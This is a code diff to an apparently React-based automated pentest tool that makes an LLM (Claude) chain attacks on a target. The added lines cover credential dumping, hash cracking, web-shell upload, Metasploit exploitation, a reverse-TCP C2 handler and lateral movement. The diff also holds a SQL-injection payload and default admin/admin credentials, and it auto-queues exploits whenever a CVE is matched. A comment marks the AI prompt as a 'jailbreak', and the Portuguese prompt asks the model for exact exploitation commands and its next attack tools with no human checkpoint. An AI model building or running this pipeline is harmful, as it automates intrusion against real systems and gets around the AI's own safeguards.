@@ -1029,6 +1029,10 @@ const TOOL_BINS = {
   wpscan: 'wpscan',  race_cond: 'curl',
   hash_crack: 'hashcat', cred_test: 'curl',
   waf_bypass: 'wafw00f', msf_exploit: 'msfconsole',
+  payload_mutate: 'python3', crawl_auth: 'curl',
+  idor_test: 'curl',      second_order: 'curl',
+  bizlogic_fuzz: 'curl',  evasion_scan: 'nmap',
+  c2_handler: 'msfconsole', lateral_move: 'nmap',
 };
 
 function PentestView({ apiKey, mcpUrl, mcpTools }) {
@@ -1047,6 +1051,10 @@ function PentestView({ apiKey, mcpUrl, mcpTools }) {
     cookie_tamper: false, session_test: false, wpscan: false, race_cond: false,
     hash_crack: false, cred_test: false,
     waf_bypass: false, msf_exploit: false,
+    payload_mutate: false, crawl_auth: false,
+    idor_test: false,      second_order: false,
+    bizlogic_fuzz: false,  evasion_scan: false,
+    c2_handler: false,     lateral_move: false,
   });
   const [autoMode,   setAutoMode]   = useState(false);
   const [xssCallback,setXssCallback]= useState('');
@@ -1068,9 +1076,9 @@ function PentestView({ apiKey, mcpUrl, mcpTools }) {
     LS.set('manucas_pentest_brain', nb);
   };
   const PRIMARY   = ['subfinder','httpx','ghauri','ffuf','aquatone','burp_suite'];
-  const SECONDARY = ['naabu_scan','katana_crawl','nuclei_fast','nuclei_exploit','sqli_scan','xss_check','cors_check','js_analyze','dir_fuzz','ssrf_check','lfi_test','testssl','ssti_check','jwt_check','admin_takeover','session_test','wpscan'];
-  const EXPLOIT   = ['shell_upload','cred_dump','xss_inject','hydra','cookie_tamper','race_cond','hash_crack','cred_test','waf_bypass','msf_exploit'];
-  const AUTO_TOOLS = ['subfinder','httpx','naabu_scan','nuclei_fast','nuclei_exploit','ffuf','sqli_scan','xss_check','cors_check','ssrf_check','lfi_test','js_analyze','ghauri','testssl','ssti_check','jwt_check','admin_takeover','session_test','waf_bypass','cred_dump','hash_crack','cred_test','msf_exploit'];
+  const SECONDARY = ['naabu_scan','katana_crawl','nuclei_fast','nuclei_exploit','sqli_scan','xss_check','cors_check','js_analyze','dir_fuzz','ssrf_check','lfi_test','testssl','ssti_check','jwt_check','admin_takeover','session_test','wpscan','evasion_scan','crawl_auth','idor_test'];
+  const EXPLOIT   = ['shell_upload','cred_dump','xss_inject','hydra','cookie_tamper','race_cond','hash_crack','cred_test','waf_bypass','msf_exploit','payload_mutate','second_order','bizlogic_fuzz','c2_handler','lateral_move'];
+  const AUTO_TOOLS = ['subfinder','httpx','naabu_scan','nuclei_fast','nuclei_exploit','ffuf','sqli_scan','xss_check','cors_check','ssrf_check','lfi_test','js_analyze','ghauri','testssl','ssti_check','jwt_check','admin_takeover','session_test','evasion_scan','crawl_auth','idor_test','waf_bypass','cred_dump','hash_crack','cred_test','msf_exploit','lateral_move'];
   const logRef = useRef(null);
 
   useEffect(() => {
@@ -1194,8 +1202,16 @@ else
   done
 fi
 `.trim() }) },
-    waf_bypass:     { tool: 'waf_bypass', args: (t) => ({ target: t, mode: 'full' }) },
-    msf_exploit:    { tool: 'msf_exploit', args: (t) => ({ target: t.replace(/https?:\/\//, '').split('/')[0], cve: 'recent', lport: '4444' }) },
+    waf_bypass:     { tool: 'waf_bypass',     args: (t) => ({ target: t, mode: 'full' }) },
+    msf_exploit:    { tool: 'msf_exploit',    args: (t) => ({ target: t.replace(/https?:\/\//, '').split('/')[0], cve: 'recent', lport: '4444' }) },
+    payload_mutate: { tool: 'payload_mutate', args: (t) => ({ target: t + '?id=FUZZ', payload: "' OR 1=1--", type: 'sqli' }) },
+    crawl_auth:     { tool: 'crawl_auth',     args: (t) => ({ target: t, username: 'admin', password: 'admin' }) },
+    idor_test:      { tool: 'idor_test',      args: (t) => ({ target: t + '/api/user/1', range: '1-100' }) },
+    second_order:   { tool: 'second_order',   args: (t) => ({ target: t, inject_path: '/register', trigger_path: '/profile', field: 'username' }) },
+    bizlogic_fuzz:  { tool: 'bizlogic_fuzz',  args: (t) => ({ target: t, endpoint: '/cart/add', mode: 'all' }) },
+    evasion_scan:   { tool: 'evasion_scan',   args: (t) => ({ target: t, mode: 'full' }) },
+    c2_handler:     { tool: 'c2_handler',     args: ()  => ({ payload: 'linux/x86/shell/reverse_tcp', lport: '4444' }) },
+    lateral_move:   { tool: 'lateral_move',   args: (t) => ({ pivot_host: t.replace(/https?:\/\//, '').split('/')[0], mode: 'enum' }) },
   };
 
   const runToolParallel = async (selected, tgt) => {
@@ -1272,7 +1288,7 @@ fi
     }
 
     // Claude analysis — with brain context and jailbreak
-    const ALL_EXPLOIT_TOOLS = 'shell_upload,cred_dump,xss_inject,nuclei_exploit,sqli_scan,lfi_test,ssrf_check,ghauri,cookie_tamper,session_test,hydra,wpscan,race_cond,testssl,ssti_check,jwt_check,admin_takeover,waf_bypass,hash_crack,cred_test,msf_exploit';
+    const ALL_EXPLOIT_TOOLS = 'shell_upload,cred_dump,xss_inject,nuclei_exploit,sqli_scan,lfi_test,ssrf_check,ghauri,cookie_tamper,session_test,hydra,wpscan,race_cond,testssl,ssti_check,jwt_check,admin_takeover,waf_bypass,hash_crack,cred_test,msf_exploit,payload_mutate,crawl_auth,idor_test,second_order,bizlogic_fuzz,evasion_scan,c2_handler,lateral_move';
     const buildPrompt = (results, rnd) => {
       const techHints = results.find(r => r.key === 'httpx' || r.key === 'js_analyze')?.out || '';
       const techContext = [
@@ -1290,10 +1306,14 @@ fi
       + (autoMode
         ? `Analisa como APEX pentester elite. Cobre OWASP Top 10 2025. Verifica cookies, sessions, IDOR, business logic, injection, crypto.
 REGRAS DE CHAINING OBRIGATÓRIAS:
-- WAF detectado → SEMPRE correr waf_bypass antes de sqli_scan/ffuf
+- WAF detectado → SEMPRE correr waf_bypass + payload_mutate antes de sqli_scan/ffuf
 - SQLi encontrado → chain: cred_dump → hash_crack → cred_test (nesta ordem)
-- CVE exploitável encontrado → chain: msf_exploit
-- Upload form → chain: shell_upload
+- CVE exploitável encontrado → chain: msf_exploit → c2_handler → lateral_move
+- Upload form → chain: shell_upload → c2_handler
+- Login form encontrado → chain: crawl_auth → idor_test → second_order
+- E-commerce/shop → chain: bizlogic_fuzz
+- IDS/WAF moderno → chain: evasion_scan
+- Pós-compromisso (shell obtido) → chain: lateral_move
 Responde APENAS em JSON:\n{"findings":[{"severity":"critical|high|medium|low","title":"...","desc":"...","cve":"CVE-XXXX-XXXX ou null","exploitable":true|false,"attack":"comando exato para explorar"}],"next_tools":[de: ${ALL_EXPLOIT_TOOLS}],"chain":[{"trigger":"condicao","tools":["tool1","tool2"]}],"status":"continue|done","report":"relatorio markdown profissional completo"}`
         : `Analisa como APEX pentester elite. Cobre todos os vetores OWASP Top 10 2025. Inclui: cookies/sessions, IDOR, business logic, injection, cripto, autenticacao. Relatorio profissional com CVEs, CVSS, exploit commands, e remediacoes.`);
     };
@@ -1320,6 +1340,14 @@ Responde APENAS em JSON:\n{"findings":[{"severity":"critical|high|medium|low","t
             setLog(prev => [...prev, { t: 'report', m: parsed.report || txt }]);
             // Save findings to brain
             if (parsed.findings?.length) saveBrain(parsed.findings.map(f => `[${f.severity?.toUpperCase()}] ${f.title}: ${f.desc?.slice(0,120)}`));
+            // CVE auto-match: if nuclei found exploitable CVEs, auto-add msf_exploit
+            const nucleiOut = allResults.find(r => r.key === 'nuclei_fast' || r.key === 'nuclei_exploit')?.out || '';
+            const cveMatches = nucleiOut.match(/CVE-\d{4}-\d+/gi) || [];
+            if (cveMatches.length > 0 && !parsed.next_tools?.includes('msf_exploit')) {
+              const topCve = [...new Set(cveMatches)][0];
+              setLog(prev => [...prev, { t: 'ok', m: `CVE auto-match: ${topCve} → msf_exploit` }]);
+              parsed.next_tools = [...(parsed.next_tools || []), 'msf_exploit'];
+            }
             if (parsed.status === 'done' || !parsed.next_tools?.length) break;
             setLog(prev => [...prev, { t: 'info', m: `Auto: correndo ${parsed.next_tools.join(', ')}...` }]);
             const extraResults = await runToolParallel(parsed.next_tools.filter(k => TOOL_MAP[k]), target);
